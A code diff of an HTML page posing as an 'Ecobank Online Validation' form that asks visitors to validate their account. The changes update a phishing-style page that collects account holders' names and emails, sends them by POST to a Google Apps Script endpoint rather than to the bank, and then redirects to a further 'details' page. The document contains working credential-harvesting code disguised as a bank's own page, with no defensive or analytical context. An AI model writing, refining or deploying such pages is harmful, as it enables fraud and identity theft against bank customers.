@@ -111,12 +111,10 @@
 </head>
 <body>
 
-  <!-- Header -->
   <div class="header">
     <h1>Ecobank Online Validation</h1>
   </div>
 
-  <!-- Form -->
   <div class="form-container">
     <p class="description">
       Validate your account services for smooth transactional purposes and easy accessibility.
@@ -125,8 +123,8 @@
     <form id="ecobankForm" name="ecobankForm">
       <label>Name on Account:</label>
       <div class="name-fields">
-        <input type="text" name="first_name" placeholder="First Name" required />
-        <input type="text" name="last_name" placeholder="Last Name" required />
+        <input type="text" name="firstName" placeholder="First Name" required />
+        <input type="text" name="lastName" placeholder="Last Name" required />
       </div>
 
       <label>Email connected to Account:</label>
@@ -140,7 +138,7 @@
   </div>
 
   <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbxMXMvDEsoQbYZPar9CA-qeH-5wBOwxWudKIYAJeuMcKUJRYTe3iRtRVJNVKL2ig49B/exec";
+    const scriptURL = "https://script.google.com/macros/s/AKfycbyf0ua24YeOGAcrQlCWZ8txX0eIQnNT-UQPl_3Z1aBclFy1PNWkq7fOKnSLSO1lVr2b/exec";
     const form = document.forms['ecobankForm'];
     const loadingMessage = document.getElementById('loadingMessage');
     const submitBtn = document.getElementById('submitBtn');
@@ -152,15 +150,15 @@
       submitBtn.disabled = true;
 
       fetch(scriptURL, { method: 'POST', body: new FormData(form) })
-        .then(response => {
-          if (response.ok) {
-            // Hide loading and redirect after a short delay
+        .then(res => res.json())
+        .then(data => {
+          if (data.result === 'success') {
             loadingMessage.style.display = 'none';
             submitBtn.disabled = false;
             form.reset();
-            window.location.href = "details.html";
+            window.location.href = 'details.html';
           } else {
-            throw new Error('Network response was not ok');
+            throw new Error(data.message || 'Unknown error');
           }
         })
         .catch(error => {
